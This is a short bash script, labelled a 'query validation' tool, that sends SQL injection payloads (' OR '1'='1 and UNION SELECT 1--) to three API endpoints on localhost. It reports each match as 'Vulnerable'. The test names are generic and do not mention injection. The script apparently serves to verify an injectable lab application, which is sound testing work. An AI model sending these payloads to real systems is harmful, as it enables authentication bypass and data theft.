#!/bin/bash
# Query validation script

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

BASE_URL="http://localhost:8080"
TOTAL=0
PASSED=0
FAILED=0

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}Query Validation Script${NC}"
echo -e "${BLUE}========================================${NC}"
echo ""

test_case() {
    local name="$1"
    local url="$2"
    local pattern="$3"
    TOTAL=$((TOTAL + 1))
    echo -e "\n${YELLOW}[Test $TOTAL]${NC} $name"
    echo "URL: $url"

    response=$(curl -s "$url" 2>/dev/null)
    if echo "$response" | grep -qiE "$pattern"; then
        echo -e "  ${GREEN}[✓] Vulnerable${NC}"
        PASSED=$((PASSED + 1))
    else
        echo -e "  ${RED}[✗] Test failed${NC}"
        FAILED=$((FAILED + 1))
    fi
}

echo -e "${BLUE}=== Query Tests ===${NC}"

test_case "Basic query" \
    "${BASE_URL}/api/v1/query/user?name=admin' OR '1'='1" \
    "admin|success|Username"

test_case "Search query" \
    "${BASE_URL}/api/v1/query/search?q=test' OR '1'='1" \
    "test|admin|success"

test_case "Sort query" \
    "${BASE_URL}/api/v1/query/sort?by=id UNION SELECT 1--" \
    "id|1|Username"

# Summary
echo -e "\n${BLUE}========================================${NC}"
echo "Total tests: ${YELLOW}$TOTAL${NC}"
echo "Passed: ${GREEN}$PASSED${NC}"
echo "Failed: ${RED}$FAILED${NC}"

if [ $FAILED -eq 0 ]; then
    echo -e "\n${GREEN}All tests passed!${NC}"
fi
